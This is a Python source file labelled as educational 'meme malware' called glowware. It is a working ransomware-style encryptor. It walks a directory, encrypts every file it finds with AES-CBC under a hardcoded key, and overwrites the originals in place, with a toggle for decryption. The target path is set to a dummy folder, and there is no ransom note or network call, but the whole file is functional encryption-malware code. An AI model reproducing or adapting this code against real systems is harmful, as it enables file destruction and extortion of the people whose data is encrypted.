# # # # # # # # # # # # # # # # # # # # # # # # # #
# SHOULD NOT BE USED AS REAL MALWARE              #
# PURELY FOR EDUCATIONAL PURPOSES                 #
#         _                                       #
#    __ _| | _____      ____ _ _ __ ___           #
#   / _` | |/ _ \ \ /\ / / _` | '__/ _ \          #
#  | (_| | | (_) \ V  V / (_| | | |  __/          #  
#   \__, |_|\___/ \_/\_/ \__,_|_|  \___|          #
#   |___/                                         #  
#                                                 #
# it glows in the dark                            #
# a meme malware made by lytix (https://lytix.dev)# 
# # # # # # # # # # # # # # # # # # # # # # # # # #

import os
import hashlib
from base64 import b64encode, b64decode
from Crypto import Random
from Crypto.Cipher import AES

FILES_TO_ENCRYPT = "dummy_files"  # relative path
ENCRYPTION_KEY = "NFTs_are_a_scam"

# AESC -> AES cipher
# Same as used in github.com/lytixdev/stpwm.
# Modified do only use bytes.
# I feel there is a way to avoid encoding the plain_text \
# as base64, but I haven't found a neat solution yet.
class AESC:
    def __init__(self, key):
        self.block_size = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()
        key = None  # overwrite plain text password as it's not used anymore

    def __pad__(self, file_content: bytes) -> bytes:
        number_of_bytes_to_pad = self.block_size - len(file_content) % self.block_size
        #padding = number_of_bytes_to_pad * b"="
        #padded_plain_text = file_content + padding
        ascii_string = chr(number_of_bytes_to_pad)
        padding = number_of_bytes_to_pad * ascii_string
        padded_plain_text = file_content + padding.encode("utf-8")
        return padded_plain_text

    def __unpad__(self, decrypted_bytes: bytes) -> bytes:
        last_character = decrypted_bytes[len(decrypted_bytes) - 1:]
        return decrypted_bytes[:-ord(last_character)]

    def encrypt(self, file_content: bytes) -> bytes:
        plain_text = self.__pad__(file_content)
        iv = Random.new().read(self.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted_text = cipher.encrypt(plain_text)
        return b64encode(iv + encrypted_text)

    def decrypt(self, encrypted_text: bytes) -> bytes:
        encrypted_text = b64decode(encrypted_text)
        iv = encrypted_text[:self.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_bytes = cipher.decrypt(encrypted_text[self.block_size:])
        return self.__unpad__(decrypted_bytes)


def find_files():
    to_encrypt = []
    for root, dirs, files in os.walk(FILES_TO_ENCRYPT):
        for file in files:
            to_encrypt.append(root + "/" + file)

    return to_encrypt


def get_file_content(file_path):
    out = b""
    with open(file_path, "rb") as f:
        for line in f.readlines():
            out += line

    return out


def encrypt_file(AES, file):
    contents = get_file_content(file)
    return AES.encrypt(contents)


def decrypt_file(AES, file):
    contents = get_file_content(file)
    return AES.decrypt(contents)


def write_to_file(file, raw_bytes):
    with open(file, "wb") as f:
        f.write(raw_bytes)


def main():
    AES = AESC(ENCRYPTION_KEY)
    files = find_files()

    encrypt = True  # True -> encrypt files, False -> decrypt files
    for file in files:
        print("found " + file)
        if encrypt:
            data = encrypt_file(AES, file)
        else:
            data = decrypt_file(AES, file)
        write_to_file(file, data)


if __name__ == "__main__":
    main()
